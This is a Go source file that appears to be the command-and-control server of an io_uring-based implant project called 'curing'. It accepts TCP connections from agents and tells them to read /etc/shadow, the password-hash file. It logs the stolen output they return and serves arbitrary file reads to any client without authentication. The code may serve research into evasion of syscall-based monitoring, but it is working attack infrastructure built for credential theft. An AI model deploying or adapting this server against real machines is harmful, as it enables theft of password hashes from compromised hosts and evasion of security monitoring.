package server

import (
	"bytes"
	"context"
	"encoding/gob"
	"fmt"
	"log/slog"
	"net"
	"os"
	"syscall"

	"github.com/amitschendel/curing/pkg/common"
	"github.com/iceber/iouring-go"
	"golang.org/x/sys/unix"
)

type Server struct {
	host string
	port int
}

func NewServer(host string, port int) *Server {
	return &Server{
		host: host,
		port: port,
	}
}

func (s *Server) Run() {
	address := fmt.Sprintf("%s:%d", s.host, s.port)
	slog.Info("Starting server", "address", address)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		slog.Error("Failed to start server", "error", err, "address", address)
		os.Exit(1)
	}
	defer func(listener net.Listener) {
		_ = listener.Close()
	}(listener)

	for {
		conn, err := listener.Accept()
		if err != nil {
			slog.Error("Failed to accept the connection", "error", err)
			continue
		}
		go handleRequest(conn)
	}
}

// In server:
func handleRequest(conn net.Conn) {
	defer func(conn net.Conn) {
		_ = conn.Close()
	}(conn)

	decoder := gob.NewDecoder(conn)
	encoder := gob.NewEncoder(conn)

	r := &common.Request{}
	if err := decoder.Decode(r); err != nil {
		slog.Error("Failed to decode request", "error", err)
		return
	}
	slog.Info("Received request", "type", r.Type)

	switch r.Type {
	case common.GetCommands:
		commands := []common.Command{
			common.ReadFile{Id: "read shadow", Path: "/etc/shadow"},
		}

		slog.Info("About to encode commands", "commands", commands)

		// Try encoding to a buffer first to verify the data
		var buf bytes.Buffer
		tmpEncoder := gob.NewEncoder(&buf)
		if err := tmpEncoder.Encode(commands); err != nil {
			slog.Error("Failed to encode to buffer", "error", err)
			return
		}

		slog.Info("Successfully encoded to buffer", "size", buf.Len())

		if err := encoder.Encode(commands); err != nil {
			slog.Error("Failed to encode commands", "error", err)
			return
		}

		slog.Info("Successfully encoded to connection")
		// Ensure all data is written before closing
		if conn, ok := conn.(*net.TCPConn); ok {
			conn.CloseWrite()
		}

	case common.ReadFileRequest:
		slog.Info("Received file read request", "filePath", r.FilePath)

		// Read the requested file directly on server side using io_uring
		result := handleFileReadRequest(r.FilePath)

		// Send the result back
		if err := encoder.Encode(result); err != nil {
			slog.Error("Failed to encode file read result", "error", err)
			return
		}

		slog.Info("File read result sent", "filePath", r.FilePath, "success", result.ReturnCode == 0)

	case common.SendResults:
		for _, r := range r.Results {
			slog.Info("Received result", "result", r.CommandID, "returnCode", r.ReturnCode)
			slog.Info("Output preview", "output", string(r.Output))
		}

	default:
		slog.Error("Unknown request type", "type", r.Type)
	}
}

// handleFileReadRequest reads a file using io_uring and returns the result
func handleFileReadRequest(filePath string) common.Result {
	result := common.Result{
		CommandID: "file-read-" + filePath,
	}

	// Create io_uring instance
	ring, err := iouring.New(32)
	if err != nil {
		result.ReturnCode = 1
		result.Output = []byte("Failed to create io_uring: " + err.Error())
		return result
	}
	defer ring.Close()

	resultChan := make(chan iouring.Result, 32)
	ctx := context.Background()

	// Open file with io_uring
	flags := syscall.O_RDONLY
	openReq, err := iouring.Openat(unix.AT_FDCWD, filePath, uint32(flags), 0)
	if err != nil {
		result.ReturnCode = 1
		result.Output = []byte("Failed to create open request: " + err.Error())
		return result
	}

	if _, err := ring.SubmitRequest(openReq, resultChan); err != nil {
		result.ReturnCode = 1
		result.Output = []byte("Failed to submit open request: " + err.Error())
		return result
	}

	select {
	case openRes := <-resultChan:
		if openRes.Err() != nil {
			result.ReturnCode = 1
			result.Output = []byte("Failed to open file: " + openRes.Err().Error())
			return result
		}

		fd := openRes.ReturnValue0().(int)
		defer closeFile(ring, resultChan, fd)

		// Get file size using io_uring statx
		var statxBuf unix.Statx_t
		statxReq, err := iouring.Statx(fd, "", unix.AT_EMPTY_PATH, unix.STATX_SIZE, &statxBuf)
		if err != nil {
			result.ReturnCode = 1
			result.Output = []byte("Failed to create statx request: " + err.Error())
			return result
		}

		if _, err := ring.SubmitRequest(statxReq, resultChan); err != nil {
			result.ReturnCode = 1
			result.Output = []byte("Failed to submit statx request: " + err.Error())
			return result
		}

		select {
		case statxRes := <-resultChan:
			if statxRes.Err() != nil {
				result.ReturnCode = 1
				result.Output = []byte("Failed to get file size: " + statxRes.Err().Error())
				return result
			}

			// Pre-allocate buffer based on file size
			fileSize := int64(statxBuf.Size)
			output := make([]byte, 0, fileSize)

			// Read file in chunks using io_uring
			const chunkSize = 32 * 1024 // 32KB chunks
			var offset int64 = 0

			for offset < fileSize {
				// Check for context cancellation
				select {
				case <-ctx.Done():
					result.ReturnCode = 1
					result.Output = []byte("Operation cancelled")
					return result
				default:
					// Continue processing
				}

				// Calculate the size of the next chunk
				remaining := fileSize - offset
				currentChunkSize := chunkSize
				if remaining < chunkSize {
					currentChunkSize = int(remaining)
				}

				// Prepare buffer and read request
				buf := make([]byte, currentChunkSize)
				readReq := iouring.Pread(fd, buf, uint64(offset))
				if _, err := ring.SubmitRequest(readReq, resultChan); err != nil {
					result.ReturnCode = 1
					result.Output = []byte("Failed to submit read request: " + err.Error())
					return result
				}

				select {
				case readRes := <-resultChan:
					if readRes.Err() != nil {
						result.ReturnCode = 1
						result.Output = []byte("Failed to read file: " + readRes.Err().Error())
						return result
					}

					bytesRead := readRes.ReturnValue0().(int)
					if bytesRead <= 0 {
						break
					}

					output = append(output, buf[:bytesRead]...)
					offset += int64(bytesRead)
				case <-ctx.Done():
					result.ReturnCode = 1
					result.Output = []byte("Operation cancelled")
					return result
				}
			}

			result.ReturnCode = 0
			result.Output = output
			return result
		case <-ctx.Done():
			result.ReturnCode = 1
			result.Output = []byte("Operation cancelled")
			return result
		}
	case <-ctx.Done():
		result.ReturnCode = 1
		result.Output = []byte("Operation cancelled")
		return result
	}
}

// closeFile closes a file descriptor using io_uring
func closeFile(ring *iouring.IOURing, resultChan chan iouring.Result, fd int) {
	closeReq := iouring.Close(fd)
	if _, err := ring.SubmitRequest(closeReq, resultChan); err != nil {
		slog.Error("Failed to submit close request", "error", err)
		return
	}

	select {
	case closeRes := <-resultChan:
		if closeRes.Err() != nil {
			slog.Error("Failed to close file", "error", closeRes.Err())
		}
	default:
		slog.Error("Failed to close file: timeout")
	}
}
